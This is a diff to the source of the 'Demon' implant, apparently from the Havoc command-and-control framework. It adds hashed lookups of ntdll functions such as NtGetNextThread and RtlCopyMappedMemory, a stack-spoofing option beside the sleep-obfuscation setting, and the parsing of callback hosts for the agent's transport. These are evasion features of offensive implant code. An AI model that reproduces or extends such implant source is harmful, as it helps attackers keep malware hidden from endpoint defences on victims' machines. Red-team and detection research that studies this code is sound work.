@@ -293,16 +293,19 @@ VOID DemonInit( VOID )
         Instance.Win32.RtlGetVersion                     = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_RTLGETVERSION );
         Instance.Win32.RtlCreateTimerQueue               = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_RTLCREATETIMERQUEUE );
         Instance.Win32.RtlCreateTimer                    = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_RTLCREATETIMER );
+        Instance.Win32.RtlRegisterWait                   = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_RTLREGISTERWAIT );
         Instance.Win32.RtlDeleteTimerQueue               = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_RTLDELETETIMERQUEUE );
         Instance.Win32.RtlCaptureContext                 = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_RTLCAPTURECONTEXT );
         Instance.Win32.RtlAddVectoredExceptionHandler    = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_RTLADDVECTOREDEXCEPTIONHANDLER );
         Instance.Win32.RtlRemoveVectoredExceptionHandler = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_RTLREMOVEVECTOREDEXCEPTIONHANDLER );
+        Instance.Win32.RtlCopyMappedMemory               = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_RTLCOPYMAPPEDMEMORY );
 
         Instance.Win32.NtClose                           = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTCLOSE );
         Instance.Win32.NtCreateEvent                     = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTCREATEEVENT );
         Instance.Win32.NtSetEvent                        = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTSETEVENT );
         Instance.Win32.NtSetInformationThread            = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTSETINFORMATIONTHREAD );
         Instance.Win32.NtSetInformationVirtualMemory     = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTSETINFORMATIONVIRTUALMEMORY );
+        Instance.Win32.NtGetNextThread                   = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTGETNEXTTHREAD );
     } else {
         PUTS( "Failed to load ntdll from PEB" )
         return;
@@ -879,8 +882,8 @@ VOID DemonConfig()
     ParserNew( &Parser, AgentConfig, sizeof( AgentConfig ) );
     RtlSecureZeroMemory( AgentConfig, sizeof( AgentConfig ) );
 
-    Instance.Config.Sleeping       = ParserGetInt32( &Parser );
-    Instance.Config.Jitter         = ParserGetInt32( &Parser );
+    Instance.Config.Sleeping = ParserGetInt32( &Parser );
+    Instance.Config.Jitter   = ParserGetInt32( &Parser );
     PRINTF( "Sleep: %d (%d%%)\n", Instance.Config.Sleeping, Instance.Config.Jitter )
 
     Instance.Config.Memory.Alloc   = ParserGetInt32( &Parser );
@@ -903,20 +906,23 @@ VOID DemonConfig()
     MemCopy( Instance.Config.Process.Spawn86, Buffer, Length );
 
     PRINTF(
-            "[CONFIG] Spawn: \n"
-            " - [x64] => %ls  \n"
-            " - [x86] => %ls  \n",
-            Instance.Config.Process.Spawn64,
-            Instance.Config.Process.Spawn86
+        "[CONFIG] Spawn: \n"
+        " - [x64] => %ls  \n"
+        " - [x86] => %ls  \n",
+        Instance.Config.Process.Spawn64,
+        Instance.Config.Process.Spawn86
     )
 
     Instance.Config.Implant.SleepMaskTechnique = ParserGetInt32( &Parser );
+    Instance.Config.Implant.StackSpoof         = ParserGetInt32( &Parser );
     Instance.Config.Implant.DownloadChunkSize  = 512000; /* 512k by default. */
 
     PRINTF(
         "[CONFIG] Sleep Obfuscation: \n"
-        " - Technique: %d \n",
-        Instance.Config.Implant.SleepMaskTechnique
+        " - Technique: %d \n"
+        " - Stack Dup: %s \n",
+        Instance.Config.Implant.SleepMaskTechnique,
+        Instance.Config.Implant.StackSpoof ? "TRUE" : "FALSE"
     )
 
 #ifdef TRANSPORT_HTTP
@@ -934,13 +940,13 @@ VOID DemonConfig()
     Instance.Config.Transport.HostRotation   = ParserGetInt32( &Parser );
     Instance.Config.Transport.HostMaxRetries = 0;  /* Max retries. 0 == infinite retrying
                                                     * TODO: add this to the yaotl language and listener GUI */
-    Instance.Config.Transport.Hosts          = NULL;
-    Instance.Config.Transport.Host           = NULL;
+    Instance.Config.Transport.Hosts = NULL;
+    Instance.Config.Transport.Host  = NULL;
 
     /* J contains our Hosts counter */
     J = ParserGetInt32( &Parser );
     PRINTF( "[CONFIG] Hosts [%d]\n:", J )
-    for ( INT i = 0; i < J; i++ )
+    for ( int i = 0; i < J; i++ )
     {
         Buffer = ParserGetBytes( &Parser, &Length );
         Temp   = ParserGetInt32( &Parser );
@@ -948,9 +954,10 @@ VOID DemonConfig()
         PRINTF( " - %ls:%ld\n", Buffer, Temp )
 
         /* if our host address is longer than 0 then lets use it. */
-        if ( Length > 0 )
+        if ( Length > 0 ) {
             /* Add parse host data to our linked list */
             HostAdd( Buffer, Length, Temp );
+        }
     }
     PRINTF( "Hosts added => %d\n", HostCount() )
 
